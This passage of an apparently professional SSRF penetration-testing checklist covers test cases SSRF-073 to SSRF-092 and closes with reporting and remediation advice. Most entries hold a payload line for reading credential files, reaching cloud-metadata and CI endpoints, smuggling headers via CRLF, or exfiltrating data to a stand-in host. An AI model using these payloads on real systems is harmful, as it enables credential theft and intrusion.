## SSRF-073 — Post-ex: secret/credential harvesting via file read
**Test Category:** Post-Exploitation · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** file:// LFI through SSRF

**Test Steps:** 1. Read app config/.env, DB creds, cloud creds files, private keys.<br>2. /proc/self/environ for injected secrets.<br>3. Chain harvested creds to lateral movement.

**Expected Result:** Sensitive files disclosed enabling credential reuse.

**Payload Example:**

```
?url=file:///proc/self/environ
?url=file:///var/www/.env
```

**Impact:** Credential harvest -&gt; lateral movement / privilege escalation.

**Tools:** Burp, curl

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-074 — Post-ex: internal DevOps infra (CI/registry/vault)
**Test Category:** Post-Exploitation · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF reaching Jenkins/GitLab/Nexus/Harbor/Vault

**Test Steps:** 1. Jenkins /script (Groovy) -&gt; RCE; GitLab internal API.<br>2. Registry/Nexus for artifacts/creds.<br>3. Vault at 127.0.0.1:8200 for secrets (if token leaks).

**Expected Result:** Internal DevOps services respond, exposing pipelines/artifacts/secrets.

**Payload Example:**

```
?url=http://127.0.0.1:8080/script  (Jenkins Groovy console)
```

**Impact:** Supply-chain foothold: pipeline RCE, artifact/secret theft.

**Tools:** Burp, SSRFmap

**References:** CWE-918; Assetnote Atlassian/Jenkins; HackTricks

---

## SSRF-075 — SSRF via CRLF injection / request splitting
**Test Category:** Advanced SSRF · **Severity:** High · **CVSS:** 8.4 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Fetchers building requests from unsanitized URL parts

**Test Steps:** 1. Inject %0d%0a into host/path/params to add headers or split.<br>2. Add metadata headers (Metadata-Flavor, token) the base fetch lacks.<br>3. Smuggle a second request line internally.

**Expected Result:** CRLF adds/splits headers/requests -&gt; header-gated metadata / smuggling.

**Payload Example:**

```
?url=http://169.254.169.254/%20HTTP/1.1%0d%0aHost:169.254.169.254%0d%0aMetadata-Flavor:Google%0d%0a%0d%0a
```

**Impact:** Turns header-gated metadata (GCP/Azure/IMDSv2) into exploitable SSRF.

**Tools:** Burp, SSRFmap, gopherus

**References:** CWE-918; Orange Tsai CRLF/SSRF; PayloadsAllTheThings

---

## SSRF-076 — SSRF with POST method &amp; custom body
**Test Category:** Advanced SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Fetchers exposing method/body (API proxies)

**Test Steps:** 1. Test if method/headers/body are controllable.<br>2. POST/PUT to internal APIs (create admin, trigger jobs, IMDSv2 token).<br>3. GET-only -&gt; gopher for raw POST.

**Expected Result:** Server issues attacker-defined write requests internally.

**Payload Example:**

```
POST via SSRF to http://127.0.0.1:8080/api/admin/users {"role":"admin"}
```

**Impact:** State-changing SSRF: internal writes, job triggers, IMDSv2 token PUT.

**Tools:** Burp, gopherus, SSRFmap

**References:** CWE-918; PayloadsAllTheThings; Assetnote

---

## SSRF-077 — SSRF via WebSocket connection
**Test Category:** Advanced SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** Server-initiated WS connections to a user-supplied URL

**Test Steps:** 1. Find features connecting to a ws:// URL server-side.<br>2. Point at Collaborator (ws/wss); confirm.<br>3. Target internal ws services / smuggle via ws upgrade.

**Expected Result:** Server opens a WS connection to attacker/internal target.

**Payload Example:**

```
ws_url=ws://127.0.0.1:8080/  (or wss://$COLLAB/)
```

**Impact:** SSRF via WS plumbing reaching internal realtime services.

**Tools:** Burp, wscat

**References:** CWE-918; PayloadsAllTheThings; HackTricks WebSocket

---

## SSRF-078 — SSRF via Content-Type / response-parsing abuse
**Test Category:** Advanced SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fetchers that parse fetched content (XML/JSON/oEmbed)

**Test Steps:** 1. Serve responses whose parsing triggers secondary fetch (XXE in fetched XML, oEmbed URL).<br>2. Chain: SSRF fetch -&gt; parsed content -&gt; internal fetch.<br>3. Confirm the second hop OOB.

**Expected Result:** Fetched content parsing causes a chained internal request.

**Payload Example:**

```
$ATTACKER returns XML with external entity -> http://169.254.169.254/latest/meta-data/
```

**Impact:** Second-order SSRF via response parsing; bypasses first-URL checks.

**Tools:** Burp, custom server

**References:** CWE-918; PayloadsAllTheThings; PortSwigger XXE

---

## SSRF-079 — HTTPS-only / scheme restriction bypass
**Test Category:** Advanced SSRF · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Fetchers enforcing https:// only

**Test Steps:** 1. Redirect from https allowed URL to http/gopher/file internal.<br>2. Protocol-relative //127.0.0.1/.<br>3. https to a host you control that 302s to internal http.

**Expected Result:** Https-only rule bypassed via redirect / protocol-relative.

**Payload Example:**

```
?url=https://$ATTACKER/  -> 302 gopher://127.0.0.1:6379/_...
```

**Impact:** Reopens http/gopher/file against https-only guards.

**Tools:** Burp, ngrok

**References:** CWE-918; PortSwigger; PayloadsAllTheThings

---

## SSRF-080 — Chained bypass: allowlist + redirect + parser + encoding
**Test Category:** Filter-Bypass Combinations · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Hardened endpoints resisting single-technique bypass

**Test Steps:** 1. Combine allowed-domain@ + open-redirect on allowed domain + encoded internal host + DNS alias.<br>2. Iterate one variable at a time.<br>3. Document exact working chain.

**Expected Result:** Composed payload defeats layered defenses blocking any single technique.

**Payload Example:**

```
?url=http://allowed.com@$ATTACKER/redir -> 302 http://2130706433/latest/meta-data/
```

**Impact:** Proves exploitability against 'defended' endpoints — max report credibility.

**Tools:** Burp, SSRFmap, chain scripts

**References:** CWE-918; PortSwigger SSRF labs; Orange Tsai; Assetnote

---

## SSRF-081 — Regex-validation bypass
**Test Category:** Filter-Bypass Combinations · **Severity:** High · **CVSS:** 8.4 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Weak anchoring/allowlist regex

**Test Steps:** 1. Exploit missing ^$ anchors: allowed.com.$ATTACKER, $ATTACKER/allowed.com, allowed.com.evil.com.<br>2. Newline-in-regex (. not matching \n) with %0a hosts.<br>3. Subdomain/suffix confusion.

**Expected Result:** Unanchored/loose regex lets an internal-pointing URL pass.

**Payload Example:**

```
?url=http://allowed.com.$ATTACKER/  (A -> 127.0.0.1)
```

**Impact:** Very common real-world flaw; bypasses homemade URL validators.

**Tools:** Burp, regex101

**References:** CWE-918; PortSwigger; PayloadsAllTheThings

---

## SSRF-082 — Path/normalization manipulation bypass
**Test Category:** Filter-Bypass Combinations · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Filters keyed on path/host substrings

**Test Steps:** 1. Dot-segment/normalization: http://127.0.0.1/../ , //, /./ .<br>2. Case + trailing dot host.<br>3. Add :80 / userinfo to shift parser boundaries.

**Expected Result:** Path/host normalization differences bypass substring filters.

**Payload Example:**

```
?url=http://127.0.0.1:80/./
?url=http://169.254.169.254./latest/meta-data/
```

**Impact:** Bypasses filters relying on naive substring matching.

**Tools:** Burp

**References:** CWE-918; PayloadsAllTheThings; PortSwigger

---

## SSRF-083 — Response-validation bypass (blind confirm)
**Test Category:** Filter-Bypass Combinations · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Apps rejecting non-allowed responses but still fetching

**Test Steps:** 1. Even if the app discards the response, the fetch already happened (OOB confirms).<br>2. Use OOB + timing to prove SSRF despite 'blocked' UI message.<br>3. Exfil via OOB channels (DNS in URL).

**Expected Result:** Server still performs the request though it refuses to show the response.

**Payload Example:**

```
?url=http://$COLLAB/${internal-data-in-subdomain}
```

**Impact:** Proves impact where UI claims the URL was rejected.

**Tools:** Burp Collaborator, interactsh

**References:** CWE-918; Assetnote blind SSRF; PortSwigger

---

## SSRF-084 — SSRF in REST API URL parameters
**Test Category:** API SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** REST body/query fields carrying URLs (imageUrl, callbackUrl, source)

**Test Steps:** 1. Enumerate REST params holding URLs.<br>2. Collaborator -&gt; confirm; pivot internal/metadata.<br>3. Test JSON nested fields + array items.

**Expected Result:** API endpoint fetches the URL field to your target.

**Payload Example:**

```
PUT /api/v1/profile {"avatarUrl":"http://169.254.169.254/latest/meta-data/"}
```

**Impact:** SSRF in machine-to-machine APIs; frequently metadata reach.

**Tools:** Burp, Postman

**References:** CWE-918; OWASP API Security; PayloadsAllTheThings

---

## SSRF-085 — SSRF in API connection/proxy configuration
**Test Category:** API SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** API gateway/proxy 'upstream URL', import-from-URL APIs

**Test Steps:** 1. Set upstream/import URL to Collaborator; confirm.<br>2. Point internal services / metadata.<br>3. Abuse for internal scanning via status/latency.

**Expected Result:** Gateway/proxy forwards to attacker/internal upstream.

**Payload Example:**

```
POST /api/proxy {"upstream":"http://127.0.0.1:8500/v1/kv/?recurse"}
```

**Impact:** SSRF through gateway plumbing reaching service mesh/config stores.

**Tools:** Burp, Postman, SSRFmap

**References:** CWE-918; OWASP API Security; PayloadsAllTheThings

---

## SSRF-086 — SSRF in CI/CD pipeline configuration
**Test Category:** CI/CD &amp; DevOps SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Pipeline steps fetching user-supplied URLs (build hooks, artifact URLs)

**Test Steps:** 1. Find pipeline config/webhook/artifact fields taking URLs.<br>2. Collaborator -&gt; confirm runner egress.<br>3. Point runner at cloud metadata (runners often over-privileged).

**Expected Result:** CI runner fetches attacker URL; metadata reach from privileged runner.

**Payload Example:**

```
artifact_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Runner cloud creds = pipeline + cloud compromise (supply chain).

**Tools:** Burp, SSRFmap

**References:** CWE-918; GitLab CVE-2021-22214 (CI lint/import SSRF); Assetnote CI SSRF

---

## SSRF-087 — SSRF in container-orchestration configuration
**Test Category:** CI/CD &amp; DevOps SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Fields feeding Nomad/K8s/Swarm APIs or image pull from URL

**Test Steps:** 1. Locate orchestration config taking URLs/registries.<br>2. Point at internal control-plane/registry/metadata.<br>3. Confirm reach + read cluster data.

**Expected Result:** Orchestrator control-plane/registry reachable via config SSRF.

**Payload Example:**

```
image=127.0.0.1:5000/internal  ; config_url=http://127.0.0.1:8500/v1/kv/?recurse
```

**Impact:** Cluster/registry compromise via orchestration config.

**Tools:** Burp, kubectl, SSRFmap

**References:** CWE-918; HackTricks Kubernetes; Assetnote

---

## SSRF-088 — SSRF via CSS injection in PDF generators
**Test Category:** Edge Cases · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** PDF engines resolving CSS url()/@import server-side

**Test Steps:** 1. Inject CSS url()/@import pointing at Collaborator.<br>2. Repoint internal/metadata; check if fetched during render.<br>3. Combine with HTML-to-PDF sink.

**Expected Result:** PDF renderer fetches CSS-referenced URL server-side.

**Payload Example:**

```
<style>@import url('http://169.254.169.254/latest/meta-data/');</style>
```

**Impact:** Blind SSRF via styling layer of doc generators; metadata reach.

**Tools:** Burp, wkhtmltopdf

**References:** CWE-918; Assetnote PDF SSRF; PayloadsAllTheThings

---

## SSRF-089 — SSRF via YAML parsing / external refs
**Test Category:** Edge Cases · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** YAML importers (config/import) resolving external content

**Test Steps:** 1. Supply YAML with external include/URL refs (or type tags fetching).<br>2. Point Collaborator; confirm; pivot internal.<br>3. Test unsafe loaders that fetch/deserialize.

**Expected Result:** YAML parser dereferences external ref during load.

**Payload Example:**

```
!include http://169.254.169.254/latest/meta-data/   (or URL-typed field)
```

**Impact:** SSRF via config/import pipelines; may chain to deserialization RCE.

**Tools:** Burp, custom YAML

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-090 — SSRF chained from SSTI
**Test Category:** Edge Cases · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed SSTI where template engine can make requests

**Test Steps:** 1. From SSTI, use engine HTTP client to fetch internal/metadata.<br>2. Jinja2/Twig/Freemarker network access; read response into template output.<br>3. Escalate to file read/RCE per engine.

**Expected Result:** Template engine performs attacker-directed server-side request.

**Payload Example:**

```
{{ ''.__class__.__mro__[1].__subclasses__() ... urlopen('http://169.254.169.254/latest/meta-data/') }}
```

**Impact:** SSTI-&gt;SSRF-&gt;metadata (and often RCE) — compound critical impact.

**Tools:** Burp, tplmap

**References:** CWE-918; PayloadsAllTheThings SSTI; PortSwigger

---

## SSRF-091 — Distinguish true SSRF from scanner/CDN artifacts
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any OOB callback before reporting

**Test Steps:** 1. Verify callback source IP is the SERVER, not your browser/CDN/link-scanner.<br>2. Re-test from a clean network; check UA is a server library.<br>3. Confirm reach of an internal-only target to prove server position.

**Expected Result:** Callback attributable to target's server-side fetch, not a scanner.

**Payload Example:**

```
Compare callback IP/UA vs target egress ranges; repeat unauthenticated.
```

**Impact:** Prevents false-positive reports (mail/AV unfurlers) that hurt credibility.

**Tools:** Burp Collaborator, whois, ASN lookup

**References:** CWE-918; PortSwigger SSRF; triage guidance

---

## SSRF-092 — Build client-facing SSRF impact &amp; PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. State reachable internal targets + concrete data (metadata creds, actuator env, file read).<br>2. Minimal repro (req+resp), redacted secrets, CVSS vector + justification.<br>3. Remediation: allowlist by resolved-IP, deny RFC1918/link-local, disable unused schemes, enforce IMDSv2+hop-limit, pin DNS, block redirects.

**Expected Result:** Reproducible, impact-quantified report a client can validate and fix.

**Payload Example:**

```
PoC: request -> IMDS creds -> aws sts get-caller-identity (acct 1234, redacted).
```

**Impact:** Converts a technical bug into demonstrated business risk + clear fix.

**Tools:** Burp, CVSS calculator, markdown/PoC tooling

**References:** CWE-918; OWASP SSRF Prevention Cheat Sheet; FIRST CVSS v3.1  |  TOP REFERENCES: Orange Tsai 'A New Era of SSRF' (BlackHat 2017); Assetnote SSRF research; PortSwigger Research; PayloadsAllTheThings; HackTricks; Hacker Recipes

---
